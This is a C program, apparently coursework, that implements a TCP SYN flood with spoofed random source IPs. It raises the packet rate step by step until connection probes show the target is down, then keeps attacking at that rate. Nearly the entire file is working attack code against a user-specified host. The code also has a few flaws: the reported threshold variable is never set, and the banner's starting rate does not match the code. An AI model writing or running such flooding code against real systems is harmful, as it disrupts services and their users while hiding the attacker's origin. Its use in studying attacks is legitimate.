#include <unistd.h>
#include<stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <signal.h>
#include <pthread.h>
#include <errno.h>
#include <sys/time.h>
#include <fcntl.h>


int keep_running = 1;
int packets_sent = 0;
int dos_achieved = 0;
int min_pps_found = 0;
int current_pps = 200;  
int connection_success = 1;
pthread_mutex_t mutex= PTHREAD_MUTEX_INITIALIZER;
time_t start_t;
time_t end_t;
char target_ip[16];
int target_port;
struct pseudo_tcp_header {
    u_int32_t source;
    u_int32_t dest;
    u_int8_t reserved;
    u_int8_t protocol;
    u_int16_t len;
};
int f_conn=0;
int sx_conn=0;
int connection_attempts=0;
/* the checksum function is the same one from the header.c file
provided in the template of tutorial 4a */

unsigned short checksum(unsigned short *ptr,int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}

uint32_t generate_random_ip() {
    uint32_t random_ip = 0;
    random_ip = (rand() % 223 + 1);         // First octet (1-223)
    random_ip = (random_ip << 8) | (rand() % 256);  // Second octet
    random_ip = (random_ip << 8) | (rand() % 256);  // Third octet
    random_ip = (random_ip << 8) | (rand() % 256);  // Fourth octet
    
    return random_ip;
}

void signal_handler(int sig) {
    printf("\nCaught signal %d, stopping...\n", sig);
    keep_running = 0;
}

void *syn_flood(void *args){
    int pps;
    
    //initialize server and source
    struct sockaddr_in server ;
    memset(&server, 0, sizeof(server));
    server.sin_family=AF_INET;
    server.sin_port = htons(target_port);
    if (inet_pton(AF_INET, target_ip, &server.sin_addr)<=0){
        perror("Invalid IP address: ");
        return NULL;
    }

    // create socket
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(fd < 0)
	 {
		 perror("Error creating raw socket ");
		 return NULL;
	}
    int hincl = 1;                  /* 1 = on, 0 = off */
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
    
    srand(time(NULL));
    printf("starting\n");

    //packet
    char packet[65536];
    memset(packet, 0, 65536);

    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct pseudo_tcp_header psh;

    while (keep_running ){
        pthread_mutex_lock(&mutex);
        pps= current_pps;
        pthread_mutex_unlock(&mutex);

        if (dos_achieved && min_pps_found > 0) {
            pps = min_pps_found;  
        }

        int usleep_value = 1000000 / pps;

        // Create source address with random IP
        struct sockaddr_in source;
        memset(&source, 0, sizeof(source));
        source.sin_family=AF_INET;
        source.sin_port=htons(1024+ rand() % 64535);
        source.sin_addr.s_addr = htonl(generate_random_ip());

    
        //IP header
        iph->ihl=5;
        iph->version=4;
        iph->tos=0;
        iph->tot_len=htons(sizeof(struct iphdr)+sizeof(struct tcphdr));
        iph->ttl=64;
        iph->protocol=IPPROTO_TCP;
        iph->check=0;
        iph->saddr=source.sin_addr.s_addr;
        iph->daddr=server.sin_addr.s_addr;
        iph->check=checksum((unsigned short *)packet, iph->ihl*4);

        //TCP header
        tcph->source= source.sin_port;
        tcph->dest=server.sin_port;
        tcph->seq=htonl(rand());
        tcph->ack_seq=0;
        tcph->window=htons(5840);
        tcph->check=0;
        tcph->urg_ptr=0;
        tcph->doff=5;
        tcph->fin=0;
        tcph->syn=1;
        tcph->rst=0;
        tcph->psh = 0;
        tcph->ack = 0;
        tcph->urg = 0; 

        //Pseudo-TCP header
        psh.source=source.sin_port;
        psh.dest=server.sin_port;
        psh.reserved=0;
        psh.protocol=IPPROTO_TCP;
        psh.len=htons(sizeof(struct tcphdr));

        int pseudo_len = sizeof(psh) + sizeof(struct tcphdr);
        char *pseudo_buf = malloc(pseudo_len);

        memcpy(pseudo_buf, &psh, sizeof(psh));
        memcpy(pseudo_buf + sizeof(psh), tcph, sizeof(struct tcphdr));

        tcph->check = checksum((unsigned short*)pseudo_buf, pseudo_len);
        free(pseudo_buf);
	

        if (sendto(fd,packet,ntohs(iph->tot_len),0,(struct sockaddr *)&server,sizeof(server))>=0){
            pthread_mutex_lock(&mutex);
            packets_sent++;
            pthread_mutex_unlock(&mutex);
        }

        if (packets_sent % 500 == 0) {
            pthread_mutex_lock(&mutex);
            int local_pps = pps;
            int local_threshold = min_pps_found;
            int found = dos_achieved;
            pthread_mutex_unlock(&mutex);
            
            time_t current = time(NULL);
            double elapsed = difftime(current, start_t);
            double actual_pps = elapsed > 0 ? packets_sent / elapsed : 0;
            
            if (found) {
                printf("\r[+] Flooding: Packets sent: %d | Rate: %.1f pps | DoS threshold: %d pps | Time: %.1fs", 
                       packets_sent, actual_pps, local_threshold, elapsed);
            } else {
                printf("\r[+] Testing: Packets sent: %d | Rate: %.1f pps | Target rate: %d pps | Time: %.1fs", 
                       packets_sent, actual_pps, local_pps, elapsed);
            }
            fflush(stdout);
        }
        usleep(usleep_value);
    }
    close(fd);
    return NULL;
}

void *test_connection(void *args){
    int failure_count = 0;
    int local_conn_success;
    int stable_counter = 0;
    
    // Wait before first test
    sleep(1);
    
    while (keep_running && !dos_achieved) {
        int result = 0;
        int sock;
        struct sockaddr_in server;
        struct timeval timeout;
        fd_set fdset;
        
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock >= 0) {
            // Set non-blocking
            fcntl(sock, F_SETFL, O_NONBLOCK);
            
            memset(&server, 0, sizeof(server));
            server.sin_family = AF_INET;
            server.sin_port = htons(target_port);
            if (inet_pton(AF_INET, target_ip, &server.sin_addr)<=0){
                perror("Invalid IP address: ");
                return NULL;
            }
            // Attempt to connect
            connect(sock, (struct sockaddr *)&server, sizeof(server));
            
            // Wait for connection with timeout
            FD_ZERO(&fdset);
            FD_SET(sock, &fdset);
            timeout.tv_sec = 1;
            timeout.tv_usec = 0;
            
            if (select(sock + 1, NULL, &fdset, NULL, &timeout) > 0) {
                int so_error;
                socklen_t len = sizeof(so_error);
                
                getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
                
                if (so_error == 0) {
                    result = 1;  
                }
            }
            
            close(sock);
        }
        
        // Connection test result
        local_conn_success = result;
        
        pthread_mutex_lock(&mutex);
        connection_success = local_conn_success;
        connection_attempts++;
        
        if (local_conn_success) {
            sx_conn++;
            failure_count = 0;
            stable_counter = 0;
        } else {
            f_conn++;
            failure_count++;
        }
        pthread_mutex_unlock(&mutex);
        
        // Check for DoS
        if (failure_count >= 3) {
            // Wait for stability (5 seconds)
            stable_counter++;
            
            if (stable_counter >= 5) {
                // Get stats for final report
                pthread_mutex_lock(&mutex);
                int final_pps = current_pps;
                pthread_mutex_unlock(&mutex);
                
                
                printf("\n\n[!] DoS threshold detected at %d packets per second \n", final_pps);
                printf("[!] Continuing attack at the threshold rate (%d pps)\n", min_pps_found);
                printf("[!] Press Ctrl+C to stop the attack\n\n");
                dos_achieved = 1;
                break;
            }
        } else {
            stable_counter = 0;
        }
        
        sleep(1);
    }
    
    return NULL;

}

int main (int argc,char **argv){
    if(argc!=3){
        printf("Usage: %s <target_ip> <target_port>\n", argv[0]);
        return 1;
    }
    strncpy(target_ip, argv[1], sizeof(target_ip) - 1);
    target_port = atoi(argv[2]);
    signal(SIGINT, signal_handler);
    srand(time(NULL));
    start_t = time(NULL);

    printf("===== TCP SYN Flood Calculator =====\n");
    printf("Target: %s:%d\n", target_ip, target_port);
    printf("Starting at 100 PPS, increasing by 10 PPS every 5 seconds\n");
    printf("Connection testing alongside attack to find precise DoS threshold\n");
    printf("Press Ctrl+C to stop the test\n\n");
    pthread_t flood_thread, test_thread;
    
    if (pthread_create(&flood_thread, NULL, syn_flood, NULL) != 0) {
        perror("Failed to create flood thread");
        return 1;
    }
    
    if (pthread_create(&test_thread, NULL, test_connection, NULL) != 0) {
        perror("Failed to create test thread");
        keep_running = 0;
        pthread_join(flood_thread, NULL);
        return 1;
    }
    
    // Main thread increases PPS every 5 seconds
    while (keep_running && !dos_achieved) {
        sleep(5);
        
        // Increase packet rate
        pthread_mutex_lock(&mutex);
        current_pps += 10;
        pthread_mutex_unlock(&mutex);
    }
    
    // Wait for threads to finish
    pthread_join(flood_thread, NULL);
    pthread_join(test_thread, NULL);
    
    // Calculate results
    if (dos_achieved) {
        printf("DoS threshold found: %d packets per second\n", min_pps_found);
    } else {
        printf("\n[!] Test stopped before DoS threshold was found.\n");
    }
    return 0;
}

//le nombre de packet minimum à envoyer par seconde pour le DNS(denial of service)
